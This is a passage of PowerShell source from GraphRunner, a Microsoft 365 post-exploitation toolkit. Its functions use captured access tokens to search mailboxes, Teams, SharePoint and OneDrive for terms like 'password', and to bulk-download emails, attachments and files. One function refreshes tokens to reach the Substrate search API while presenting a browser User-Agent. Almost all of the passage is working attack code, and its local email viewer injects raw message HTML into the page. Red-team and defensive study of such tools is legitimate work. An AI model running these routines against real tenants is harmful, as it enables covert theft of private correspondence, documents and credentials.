                if ($propertyValue -is [string] -and $propertyValue -like "*$searchTerm*") {
                    Write-Host -ForegroundColor green "[*] Found a match! User: $upn in attritube: $propertyName : $propertyValue"
                }
            }
        }

        if ($usersResponse.'@odata.nextLink') {
            Write-Host "[*] Gathering more users..."
            $usersEndpoint = $usersResponse.'@odata.nextLink'
        } else {
            # No more pages, exit loop
            break
        }
    } while ($true)
}


Function Invoke-SearchMailbox{
    <#
    .SYNOPSIS

        This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox.    
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox. 

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER SearchTerm

        The term you want to search for in the mailbox.

    .PARAMETER MessageCount

        The amount of messages returned in the search results (default = 25)

    .PARAMETER OutFile

        File to output a list of emails to

    .PARAMETER PageResults

        Enables paging to page through results

    .EXAMPLE
        
        C:\PS> Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
        -----------
        This will search through the current user's mailbox for the term password.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $SearchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $MessageCount = "25",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $OutFile = "",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $DetectorName = "Custom",
    [switch]
    $GraphRun,
    [switch]
    $PageResults
    )


    if($Tokens){
        if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 

    $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"

    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }

    # Define the search query
    $searchQuery = @{ requests = @( @{
        entityTypes = @("message")
        query = @{
            queryString = $searchTerm
        }
        from = 0
        size = $MessageCount
        enableTopResults = "true"
        }
    )
    }

    # Convert the search query to JSON format
    $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10

    # Perform the HTTP POST request to search emails
    $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
    
    # Process the response and display the summary
    $total = $response.value[0].hitsContainers[0].total
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Found $total matches for search term $searchTerm"
    }
    else{
        if([int]$total -gt 0){
            Write-Host -ForegroundColor yellow "[*] Found $total matches for detector: $DetectorName"
        }
    }
        
    if ($total -eq 0){return}
        
        $moreresults = "True"
        while ($moreresults -like "True") {
            $moreresults = $response.value[0].hitsContainers[0].moreResultsAvailable
            $resultsList = @()
            foreach ($hit in $response.value[0].hitsContainers[0].hits) {
            $subject = $hit.resource.subject
            $sender = $hit.resource.sender.emailAddress.address
            $receivers = $hit.resource.replyTo | ForEach-Object { $_.emailAddress.Name }
            $date = $hit.resource.sentDateTime
            $preview = $hit.resource.bodyPreview

            $LogInfo = @{
                        "Detector Name" = $DetectorName
                        "Subject" = $subject
                        "Sender" = $sender
                        "Receivers" = $receivers
                        "Date" = $date
                        "Preview" = $preview
                    }

            $resultsList += New-Object PSObject -Property $LogInfo

            if(!$GraphRun){

            Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
            Write-Host ("=" * 80) 
            }
            }
            if($OutFile){
                if(!$GraphRun){
                    Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
                }
                $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
            }

            if(!$GraphRun){
            while($download -notlike "Yes"){
                Write-Host -ForegroundColor Cyan "[*] Do you want to download these emails and their attachments? (Yes/No)"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Downloading messages..."
                    $download = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    if(!$PageResults){
                        Write-Output "[*] Quitting..."
                    }
                    else{
                        if($moreresults -like "False"){
                            Write-Host -ForegroundColor Yellow "[*] No more results. Quitting..."
                        }
                        else{
                            Write-Host -ForegroundColor yellow "[*] Trying to get next page..."
                        }
                    }
                    break
                } else {
                    Write-Output "Invalid input. Please enter Yes or No."
                }
            }

            if ($download -like "Yes"){
                $emailFileNames = @()
                $folderName = "mailsearch-" + (Get-Date -Format 'yyyyMMddHHmmss')
                New-Item -Path $folderName -ItemType Directory | Out-Null
                # Process the response and export email content
                foreach ($hit in $response.value[0].hitsContainers[0].hits) {
                $webLink = $hit.resource.webLink
                $itemId = [regex]::Match($webLink, "ItemID=([^&]+)").Groups[1].Value
                $subject = $hit.resource.subject

                # Remove special characters and replace spaces with underscores
                $cleanedSubject = $subject -replace '[^\w\s]', '' -replace '\s', '_'
        

                # Fetch email details using the message ID
                Write-Host "[*] Downloading $cleanedSubject"
                $messageDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId" -Headers $headers -Method Get
                $dateTimeString = $messageDetails.sentDateTime
                $dateTime = [DateTime]::ParseExact($dateTimeString, "yyyy-MM-ddTHH:mm:ssZ", [System.Globalization.CultureInfo]::InvariantCulture)
                $numericDate = $dateTime.ToString("yyyyMMddHHmmss")
                $filename = ($cleanedSubject + "-" + $numericDate +".json")
                $emailFileNames += $filename
                # Save email details as a .msg file
                $messageDetails | ConvertTo-Json | Out-File -FilePath "$folderName\$filename" -Encoding UTF8

                # Fetch and save attachments
                if ($messageDetails.hasAttachments -like "True") {
                        Write-Host ("[**] " + $messageDetails.subject + " has attachments.")
                        $attachmentDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId/attachments" -Headers $headers -Method Get

                        foreach($item in $attachmentDetails.value){
                        $attachmentContentBytes = [System.Convert]::FromBase64String($item.contentBytes)
                        $attachmentFileName = ($CleanedSubject + "-attached-" + $item.name)
                        Write-Host "[***] Downloading attachment $attachmentFileName"
                        $attachmentContentBytes | Set-Content -Path "$folderName\$attachmentFileName" -Encoding Byte
                        }
        
                }
                }
                # Export the email file names to filelist.json
                $emailFileNames | ConvertTo-Json | Out-File -FilePath "$folderName\filelist.json" -Encoding UTF8
                $htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .app-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            max-width: 1200px;
        }
        .email-summary {
            cursor: pointer;
            margin: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: background-color 0.2s;
        }
        .email-summary:hover {
            background-color: #f7f7f7;
        }
        .email-summary strong {
            color: #333;
        }
        .email-content {
            max-height: 500px; /* Set the maximum height for the scrollable container */
            overflow: auto; /* Enable scrolling if content exceeds the maximum height */
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <h1>GraphRunner Email Viewer</h1>
        <div id="emailList"></div>
        <div id="emailContainer" class="email-content"></div>
    </div>

    <script>
        const emailList = document.getElementById('emailList');
        const emailContainer = document.getElementById('emailContainer');

        fetchEmailList();

        async function fetchEmailList() {
            try {
                const response = await fetch('filelist.json');
                const fileListContent = await response.text();
                const fileList = JSON.parse(fileListContent);

                fileList.forEach(async (file) => {
                    const response = await fetch(file);
                    const email = await response.json();

                    const emailSummaryDiv = document.createElement('div');
                    emailSummaryDiv.classList.add('email-summary');
                    emailSummaryDiv.innerHTML = ``
                        <strong>Subject:</strong> `${email.subject}<br>
                        <strong>Sender:</strong> `${email.sender.emailAddress.name}<br>
                        <strong>From:</strong> `${email.from.emailAddress.name} (`${email.from.emailAddress.address})<br>
                        <strong>Preview:</strong> `${email.bodyPreview}<br>
                        <strong>Attachments:</strong> `${email.hasAttachments ? 'Yes' : 'No'}<br>
                    ``;
                    
                    emailSummaryDiv.addEventListener('click', () => loadFullEmail(email));
                    emailList.appendChild(emailSummaryDiv);
                });
            } catch (error) {
                console.error('Error fetching file list:', error);
            }
        }

        function loadFullEmail(email) {
            emailContainer.innerHTML = email.body.content;
        }
    </script>
</body>
</html>
"@
        
            $htmlContent | Out-File -FilePath "$folderName\emailviewer.html" -Encoding UTF8
            Write-Host -ForegroundColor yellow "[*] Emails and attachments have been exported to the folder $folderName."
            Write-Host -ForegroundColor yellow "[*] A simple emailviewer.html has been provided to view the exported emails."
            Write-Host -ForegroundColor yellow "[*] To use it run the Invoke-HTTPServer module in the $folderName directory and then navigate to http://localhost:8000/emailviewer.html"
        }
        }
        
        
        If(!$PageResults){
            $moreresults = "False"
        }
        if ($PageResults -and ($moreresults -like "True")) {
            $searchQuery.requests[0].from += $MessageCount
            $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
            $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
        }
    }
        
}



function Invoke-HTTPServer{
    <#
    .SYNOPSIS 
    A basic web server to use for accessing the emailviewer.html file output from Invoke-SearchMailbox
    #>
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [object[]]
        $port = "8000"
    )

    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Start()

    Write-Host "Listening for requests on http://localhost:$port/"

    while ($listener.IsListening) {
         $context = $listener.GetContext()
         $response = $context.Response

         $filename = $context.Request.Url.LocalPath.TrimStart('/')
         $content = Get-Content -Path $filename -Raw

         $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
         $response.ContentLength64 = $buffer.Length
         $response.OutputStream.Write($buffer, 0, $buffer.Length)
         $response.OutputStream.Close()
    }

}


function Get-SharePointSiteURLs{

      <#
        .SYNOPSIS
            Uses the Graph Search API to find SharePoint site URLs
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           Uses the Graph Search API to find SharePoint site URLs

        .EXAMPLES      
        
            C:\PS> Get-SharePointSiteURLs -Tokens $tokens
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 


    # Define the base URL and search URL
    $baseUrl = "https://graph.microsoft.com/v1.0"
    $searchUrl = "$baseUrl/search/query"

    # Define the initial query
    $query = "*"
    $sharepointDrives = @()
    $seenDriveIds = @()


        # Construct the request URL with query parameters
        $url = "$searchUrl"

        # Define the query request body
        $requestBody = @{
            requests = @(
                @{
                    entityTypes = @("drive")
                    query = @{
                        queryString = $query
                    }
                    from = "0"
                    size = "500"
                    fields = @("parentReference", "webUrl")
                }
            )
        }

        # Make a request to the Search API
        $headers = @{
            "Authorization" = "Bearer $accessToken"
        }
        Write-Host -ForegroundColor yellow "[*] Now getting SharePoint site URLs..."
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Post -ContentType "application/json" -Body ($requestBody | ConvertTo-Json -Depth 10)

        # Extract drive IDs and web URLs from the results
        $newDrives = $response.value

        foreach($hit in $newDrives.hitsContainers){
            $siteId = $hit.resource.parentReference.siteId
            $webUrl = $hit.resource.webUrl
        
            # Filter out duplicates based on drive ID
            if ($siteId -notin $seenDriveIds){
                $sharepointDrives += $hit
            }
            else{
                $seenDriveIds += $hit
            }
        
        }

    $sorted = $sharepointDrives.hits | Sort-Object {$_.resource.webUrl}

    # Display the list of unique drive IDs and web URLs
    if ($sorted.count -gt 0){
        Write-Host -ForegroundColor yellow ("[*] Found a total of " + $sorted.count + " site URLs.")
        foreach ($drive in $sorted) {
            Write-Output "Web URL: $($drive.resource.webUrl)"
        }
    }

}

function Invoke-SearchSharePointAndOneDrive{
    <#
    .SYNOPSIS

        This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.   
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER SearchTerm

         The term you want to search for. This accepts KQL queries so you can use terms like "filetype", "content", and more.

    .PARAMETER ResultCount

        The amount of files returned in the search results (default = 25)

    .PARAMETER OutFile

        File to output a list of hits to

    .PARAMETER PageResults

        Using paging it will return all possible results for a search term

    .EXAMPLE
        
        C:\PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password filetype:xlsx'
        -----------
        This will search through the all SharePoint and OneDrive drives accessible to the current user for the term password.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $SearchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $ResultCount = "25",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $DetectorName = "Custom",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $OutFile = "",
    [switch]
    $ReportOnly,
    [switch]
    $PageResults,
    [switch]
    $GraphRun
    )

    if($Tokens){
        #Suppressing output if GraphRun module is used
        if (!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 

    $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"

    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }

    # Define the search query
    $searchQuery = @{ requests = @( @{
        entityTypes = @("driveItem")
        query = @{
            queryString = $SearchTerm
        }
        from = 0
        size = $ResultCount
        }
    )
    }

    # Convert the search query to JSON format
    $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10

    # Perform the HTTP POST request to search emails
    $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson


    $resultarray = @()
    $total = $response.value[0].hitsContainers[0].total
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Found $total matches for search term $searchTerm"
    }
    else{
        if([int]$total -gt 0){
            Write-Host -ForegroundColor yellow "[*] Found $total matches for detector: $DetectorName"
        }
    }
    if ([int]$total -gt 0){
        $itemnumber = 0
       
        while ($itemnumber -lt $total) {
            $resultsList = @()
            foreach ($hit in $response.value[0].hitsContainers[0].hits) {
            $filename = $hit.resource.name
            $CreatedDate = $hit.resource.fileSystemInfo.createdDateTime
            $LastModifiedDate = $hit.resource.lastModifiedDateTime
            $sizeInBytes = $hit.resource.size
                if ($sizeInBytes -lt 1024) {
                    $sizeFormatted = "{0:N0} Bytes" -f $sizeInBytes
                } elseif ($sizeInBytes -lt 1048576) {
                    $sizeFormatted = "{0:N2} KB" -f ($sizeInBytes / 1024)
                } elseif ($sizeInBytes -lt 1073741824) {
                    $sizeFormatted = "{0:N2} MB" -f ($sizeInBytes / 1048576)
                } else {
                    $sizeFormatted = "{0:N2} GB" -f ($sizeInBytes / 1073741824)
                }
            $summary = $hit.summary
            $location = $hit.resource.webUrl
            $driveid = $hit.resource.parentReference.driveId
            $itemid = $hit.resource.id

            $resultInfo = @{
                result = $itemnumber
                filename = $filename
                driveitemids = ($driveid + ":" + $itemid)
            }
            $LogInfo = @{
                "Detector Name" = $DetectorName
                "File Name" = $filename
                "Size" = $sizeFormatted
                "Location" = $location
                "DriveItemID" = ($driveid + ":" + $itemid)
                "Preview" = $summary
                "Last Modified Date" = $LastModifiedDate
            }
            
            $resultarray += New-Object PSObject -Property $resultInfo
            $resultsList += New-Object PSObject -Property $LogInfo
            if(!$ReportOnly){
                Write-Host "Result [$itemnumber]"
                Write-Host "File Name: $filename"
                Write-Host "Location: $location"
                Write-Host "Created Date: $CreatedDate"
                Write-Host "Last Modified Date: $LastModifiedDate"
                Write-Host "Size: $sizeFormatted"
                Write-Host "File Preview: $summary"
                Write-Host "DriveID & Item ID: $driveid\:$itemid"
                Write-Host ("=" * 80) 
                }
            $itemnumber++
            }
            if($OutFile){
                if(!$GraphRun){
                    Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
                }
                $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
            }
            if ($itemnumber -lt $total -and $PageResults) {
                $searchQuery.requests[0].from += $ResultCount
                $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
                $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
            }
            If(!$PageResults){
                $itemnumber = $total
            }
        }
        if(!$ReportOnly){
        $done = $false

        while ($done -ne $true) {
            if ($done -eq "yes") {
                Write-Host -ForegroundColor Cyan "[*] Do you want to download any more files? (Yes/No)"
                $anotherDownload = Read-Host
                $anotherDownload = $anotherDownload.ToLower()

                if ($anotherDownload -eq "yes" -or $anotherDownload -eq "y") {
                    Write-Host -ForegroundColor Cyan '[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"'
                    $resulttodownload = Read-Host
                    $resultstodl = $resulttodownload.split(",")
                    foreach ($res in $resultstodl){
                        $specificfileinfo = $resultarray[$res]
                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
                    }
                } elseif ($anotherDownload -eq "no" -or $anotherDownload -eq "n") {
                    Write-Output "[*] Quitting..."
                    $done = $true
                    break
                } else {
                    Write-Output "Invalid input. Please enter Yes or No."
                }
            } else {
                Write-Host -ForegroundColor Cyan "[*] Do you want to download any of these files? (Yes/No)"
                $answer = Read-Host
                $answer = $answer.ToLower()

                if ($answer -eq "yes" -or $answer -eq "y") {
                    $done = "yes"  
                    Write-Host -ForegroundColor Cyan '[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"'
                    $resulttodownload = Read-Host
                    $resultstodl = $resulttodownload.split(",")
                    foreach ($res in $resultstodl){
                        $specificfileinfo = $resultarray[$res]
                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
                    }
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Output "[*] Quitting..."
                    $done = $true
                    break
                } else {
                    Write-Output "Invalid input. Please enter Yes or No."
                }
            }
        }
        }    
    }
}

function Invoke-DriveFileDownload{
    <#
        .SYNOPSIS

        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.   
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER DriveItemIDs

        A combined value of the drive ID and item ID separated by a colon like this: "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"

    .PARAMETER FileName

        The filename you want to download the file to

    .EXAMPLE
        
        C:\PS> Invoke-DriveFileDownload -Tokens $tokens -FileName "Passwords.docx" -DriveItemIDs "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"
        -----------
        This will download a single file from the drive specified.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $DriveItemIDs = "",
    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $FileName = ""
    )
    $access_token = $tokens.access_token
    $itemarray = $driveitemids.split(":")
    $downloadUrl = ("https://graph.microsoft.com/v1.0/drives/" + $itemarray[0] + "/items/" + $itemarray[1] + "/content")
    $downloadheaders = @{
    "Authorization" = "Bearer $access_token"
    }
    Write-Host -ForegroundColor yellow "[*] Now downloading $FileName"
    Invoke-RestMethod -Uri $downloadUrl -Headers $downloadheaders -OutFile $filename
}


function Invoke-SearchTeams{
    <#
        .SYNOPSIS

        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.   
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER SearchTerm

        The term you want to search for in Teams messages

    .PARAMETER ResultSize

        The amount of messages returned in the search results (default = 50)

    .PARAMETER OutFile

        File to output the results of the search to

    .EXAMPLE
        
        C:\PS> Invoke-SearchTeams -Tokens $tokens -SearchTerm "password" -ResultSize 100
        -----------
        This searches all Teams messages in all channels visible to the current user for the term password.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $SearchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $ResultSize = "50",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $DetectorName = "Custom",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $OutFile = "",
    [switch]
    $GraphRun
    )

    if($Tokens){
        #Suppressing output if GraphRun module is used
        if (!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshtoken = $tokens.refresh_token 


    # First we need to refresh for Teams message access

    $scope = "https://outlook.office.com//.default openid profile offline_access"
    $grantType = "refresh_token"

    # Construct the request body
    $body = @{
        client_id     = $clientId
        scope         = $scope
        grant_type    = $grantType
        refresh_token = $refreshToken
        client_info   = 1
        "client-request-id" = (New-Guid).ToString()
    }
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Refreshing token for Teams use..."
    }

    # Send the POST request
    $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body


    # We can search Teams messages with the Substrate Search API

    $access_token = $response.access_token
    $uri = "https://substrate.office.com/search/api/v2/query"
    $headers = @{
        "Authorization" = "Bearer $access_token"  
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"
        "Content-Type" = "application/json"
    }

    # Define the request body
    $body = @{
        "EntityRequests" = @(
            @{
                "entityType" = "Message"
                "contentSources" = @("Teams")
                "fields" = @(
                    "Extension_SkypeSpaces_ConversationPost_Extension_FromSkypeInternalId_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_FileData_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_ThreadType_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_SkypeGroupId_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_SenderTenantId_String"
                )
                "propertySet" = "Optimized"
                "query" = @{
                    "queryString" = "$searchTerm AND NOT (isClientSoftDeleted:TRUE)"
                    "displayQueryString" = "$searchTerm"
                }
                "size" = $ResultSize
                "topResultsCount" = 9
            }
        )
        "QueryAlterationOptions" = @{
            "EnableAlteration" = $true
            "EnableSuggestion" = $true
            "SupportedRecourseDisplayTypes" = @("Suggestion", "ServiceSideRecourseLink")
        }
        "cvid" = (New-Guid).ToString()
        "logicalId" = (New-Guid).ToString()
        "scenario" = @{
            "Dimensions" = @(
                @{
                    "DimensionName" = "QueryType"
                    "DimensionValue" = "All"
                },
                @{
                    "DimensionName" = "FormFactor"
                    "DimensionValue" = "general.web.reactSearch"
                }
            )
            "Name" = "powerbar"
        }
        "WholePageRankingOptions" = @{
            "EntityResultTypeRankingOptions" = @(
                @{
                    "MaxEntitySetCount" = 1
                    "ResultType" = "Answer"
                }
            )
            "EnableEnrichedRanking" = $true
            "EnableLayoutHints" = $true
            "SupportedSerpRegions" = @("MainLine")
            "SupportedRankingVersion" = "V3"
        }
        "Context" = @{
            "EntityContext" = @(
                @{
                    "@odata.type" = "Microsoft.OutlookServices.Message"
                    "Id" = ""
                    "ClientThreadId" = ""
                }
            )
        }
    }

    # Convert the body to JSON
    $bodyJson = $body | ConvertTo-Json -Depth 10

    # Send the POST request
    $searchresponse = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyJson


    $headers = @{
        'Authorization' = "Bearer $accessToken"
    }

    # Loop through each message
    $resultsList = @()
    foreach ($result in $searchresponse.EntitySets.ResultSets.Results) {
        if ($result.Type -like "File"){
        $ResultID = $result.ID
        $Summary = $result.HitHighlightedSummary
        $Type = $result.Type
        $From = $result.Source.Author -join ";"
        }
        else{
        $ResultID = $result.ID
        $Summary = $result.Source.Preview
        $Type = $result.Type
        $From = $result.Source.From.EmailAddress.address
        $RestID = $result.Source.ItemRestId
        $DisplayTo = $result.Source.DisplayTo
        }

        if(!$GraphRun){
            Write-Host ("From: " + $From + " | Summary: " + $summary )
        }
        If($RestID){
            $graphApiUrl = "https://graph.microsoft.com/v1.0/me/messages/$RestID"

            $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Get
            if(!$GraphRun){
                Write-Host ("Full Message Body: " + $response.body.content)
                Write-Host ("=" * 80)
            }
        }

        $LogInfo = @{
            "Detector Name" = $DetectorName
            "From" = $From
            "DisplayTo" = $DisplayTo
            "Summary" = $Summary
            "Body" = $response.body.content
        }
            
        $resultsList += New-Object PSObject -Property $LogInfo
    }
    if($OutFile){
        if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
        }
        $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
    }
}

function Invoke-CreateCalendarEvent {


    <#
        .SYNOPSIS

        This module creates a new calendar event using the Microsoft Graph API. 
